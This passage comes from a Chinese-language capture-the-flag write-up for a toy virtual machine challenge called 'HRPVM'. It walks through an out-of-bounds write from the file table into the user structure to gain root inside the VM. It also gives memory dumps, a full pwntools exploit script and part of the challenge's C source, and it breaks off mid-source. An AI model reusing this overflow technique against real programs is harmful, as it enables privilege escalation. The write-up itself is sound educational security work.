file_count;</span><br><span class="line">    *((_QWORD *)&amp;unk_204138 + 4 * v2) = malloc(0x1000uLL);</span><br><span class="line">    printf(&quot;FILE CONTENT: &quot;);</span><br><span class="line">    read(0, *((void **)&amp;unk_204138 + 4 * file_count), 0x1000uLL);</span><br><span class="line">    deleEnter(*((_QWORD *)&amp;unk_204138 + 4 * file_count));</span><br><span class="line">    ++file_count;</span><br><span class="line">    return ++global_fd;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看bss段发现控制用户权限的结构体在文件HF的下面</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.bss:0000000000204120 ??                            HF db    ? ; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.bss:0000000000204520 ?? ?? ?? ??                   users dd ? </span><br></pre></td></tr></table></figure>

<p>利用思路非常简单，创建32个文件刚好覆盖到users，然后通过逆向分析可得，users结构体的一个数据存放的是UID和GID，调试发现，第32个文件的mode刚好可以覆盖到UID和GID，并且由于mode是可以通过伪汇编修改的，open使用方法在程序的README里面照着写就行了，把mode改成0</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rdi,35;mov rsi,0;call open,2;</span><br></pre></td></tr></table></figure>

<p>之后就变成了UID&amp;GID&#x3D;&#x3D;0的用户了，现在可以进入DEBUG控制台了。</p>
<p>分析debug函数，里面主要的功能就是file input和mmap，mmap可以自定义权限为3的指定地址段。</p>
<p>file input可以把程序外指定的文件拉取到虚拟机内，拉取后默认的权限模式是1000也就是不可读状态。此时，一般的选手可能想着flag拉进来了然后exit出debug再去user态直接cat 就可以获取flag了</p>
<p>但是注意，exit后程序会把users结构体初始化</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deleEnter(buf);</span><br><span class="line">     dword_204524 = <span class="number">1000</span>;</span><br><span class="line">     users = <span class="number">1000</span>;</span><br><span class="line">     <span class="built_in">strncpy</span>(dest, src, <span class="number">8uLL</span>);</span><br><span class="line">     machine_start();</span><br></pre></td></tr></table></figure>

<p>此时UID和GID变成1000，然后dest这次存放的就是开机的时候要求输入的持有者也清0了，通过调试不难发现这个持有者变量和刚才第32个文件的存放文件名的地址重合了，因为exit这里被清0了，那么此时的flag可是在0x23个文件的下面，如果去cat 遇见第0x23个文件strcmp文件名的时候会因为地址无效程序崩溃，但是此时能获取到已知可读写的地址方法就一个，就是mmap！</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x55a2e6708500 &lt;HF+992&gt;:  0x00000000000003e8  0x000055a2e7e66c00</span><br><span class="line">0x55a2e6708510 &lt;HF+1008&gt;:  0x0000000000000022  0x000055a2e7e66c30</span><br><span class="line">0x55a2e6708520 &lt;users&gt;:  0x000003e8000003e8  0x0000000000000000</span><br><span class="line">0x55a2e6708530 &lt;users+16&gt;:  0x0000000000000023  0x000055a2e7e67c70</span><br><span class="line">0x55a2e6708540 &lt;users+32&gt;:  0x00000000000003e8  0x000055a2e7e68c80</span><br><span class="line">0x55a2e6708550 &lt;users+48&gt;:  0x0000000000000024  0x000055a2e7e68cb0</span><br><span class="line">0x55a2e6708560 &lt;users+64&gt;:  0x00000000000003e8  0x000055a2e7e69cc0</span><br><span class="line">0x55a2e6708570:  0x0000000000000025  0x000055a2e7e69f20</span><br><span class="line">0x55a2e6708580 &lt;REG&gt;:  0x0000000000000023  0x0000000000000000</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当我们mmap自定义地址后（我选择的是0x123000），还需要把地址填写到这，就像我上面分析的一样通过调试不难发现这个持有者变量和刚才第32个文件的存放文件名的地址重合了，唯一可以输入这个变量的地方就是在启动机器的时候，在machine_start函数可以找到reboot功能</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ( !strncmp(off_2040B8, (const char *)buf, v7) )</span><br><span class="line">   &#123;</span><br><span class="line">     clearScreen();</span><br><span class="line">     boot();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>此时填充holder为0x123000即可，等到虚拟机重启进来后，再用伪汇编调整flag文件的open模式即可用cat抓取</p>
<h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r=process(<span class="string">&#x27;./HRPVM&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;HRPHRP&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;PWNME&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;HRP&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">  r.recv()</span><br><span class="line">  r.sendline(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">  r.recv()</span><br><span class="line">  r.sendline(<span class="built_in">str</span>(i))</span><br><span class="line">  r.recv()</span><br><span class="line">  r.sendline(<span class="built_in">str</span>(i))</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">33</span>))</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&quot;mov rdi,35;mov rsi,0;call open,2;&quot;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;./33&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;file input&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;mmap&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">0x123000</span>))</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;exit&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">gdb.attach(r)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;reboot&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;HRPHRP&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;PWNME&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.send(p64(<span class="number">0x123000</span>))</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">39</span>))</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&quot;mov rdi,37;mov rsi,1001;call open,2;&quot;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;./39&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  MOV=<span class="number">0</span>,<span class="comment">//0</span></span><br><span class="line">  CALL=<span class="number">1</span>,<span class="comment">//1</span></span><br><span class="line">&#125;IS;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  RDI=<span class="number">0</span>,<span class="comment">//0</span></span><br><span class="line">  RSI=<span class="number">1</span>,<span class="comment">//1</span></span><br><span class="line">  RDX=<span class="number">2</span>,<span class="comment">//2</span></span><br><span class="line">  RAX=<span class="number">3</span>,<span class="comment">//3</span></span><br><span class="line"></span><br><span class="line">&#125;RG;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> REG[<span class="number">4</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user</span>&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> uid;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> gid;</span><br><span class="line">    <span class="type">char</span> holder[<span class="number">0x40</span>];</span><br><span class="line">&#125;users;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">HRPFILE</span>&#123;</span></span><br><span class="line">  <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> mod;</span><br><span class="line">  <span class="type">char</span> *filename;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> *file_content;</span><br><span class="line">    </span><br><span class="line">&#125;HF[<span class="number">0x20</span>];</span><br><span class="line"><span class="type">int</span> file_count=<span class="number">0</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> global_fd=<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> user_count=<span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> user_size=<span class="number">4096</span>;</span><br><span class="line"><span class="type">int</span> login_if=<span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> username[]=<span class="string">&quot;HRPHRP\x00&quot;</span>;</span><br><span class="line"><span class="type">char</span> password[]=<span class="string">&quot;PWNME\x00&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">write_HRP</span><span class="params">(<span class="type">int</span> fd,<span class="type">char</span> *cont,<span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">  write(fd,cont,len);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">boot_user</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  FILE *fp=fopen(&quot;./users&quot;,&quot;r+&quot;);</span></span><br><span class="line"><span class="comment">  if (!fp) &#123;</span></span><br><span class="line"><span class="comment">        perror(&quot;fopen&quot;);</span></span><br><span class="line"><span class="comment">        exit(EXIT_FAILURE);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">  username_password = malloc(0x100);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    while (fscanf(fp, &quot;%[^\n ] &quot;, username_password+user_count) != EOF) &#123;</span></span><br><span class="line"><span class="comment">      user_count+=8;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    fclose(fp);*/</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">write_banner</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> banner1[]=<span class="string">&quot; ██      ██ ███████   ███████        ████     ████     ██       ██████  ██      ██ ██ ████     ██ ████████\n&quot;</span>;</span><br><span class="line">  <span class="type">char</span> banner2[]=<span class="string">&quot;░██     ░██░██░░░░██ ░██░░░░██      ░██░██   ██░██    ████     ██░░░░██░██     ░██░██░██░██   ░██░██░░░░░\n&quot;</span>;</span><br><span class="line">  <span class="type">char</span> banner3[]=<span class="string">&quot;░██     ░██░██   ░██ ░██   ░██      ░██░░██ ██ ░██   ██░░██   ██    ░░ ░██     ░██░██░██░░██  ░██░██     \n&quot;</span>;</span><br><span class="line">  <span class="type">char</span> banner4[]=<span class="string">&quot;░██████████░███████  ░███████  █████░██ ░░███  ░██  ██  ░░██ ░██       ░██████████░██░██ ░░██ ░██░███████\n&quot;</span>;</span><br><span class="line">  <span class="type">char</span> banner5[]=<span class="string">&quot;░██░░░░░░██░██░░░██  ░██░░░░  ░░░░░ ░██  ░░█   ░██ ██████████░██       ░██░░░░░░██░██░██  ░░██░██░██░░░░ \n&quot;</span>;</span><br><span class="line">  <span class="type">char</span> banner6[]=<span class="string">&quot;░██     ░██░██  ░░██ ░██            ░██   ░    ░██░██░░░░░░██░░██    ██░██     ░██░██░██   ░░████░██     \n&quot;</span>;</span><br><span class="line">  <span class="type">char</span> banner7[]=<span class="string">&quot;░██     ░██░██   ░░██░██            ░██        ░██░██     ░██ ░░██████ ░██     ░██░██░██    ░░███░███████\n&quot;</span>;</span><br><span class="line">  <span class="type">char</span> banner8[]=<span class="string">&quot;░░      ░░ ░░     ░░ ░░             ░░         ░░ ░░      ░░   ░░░░░░  ░░      ░░ 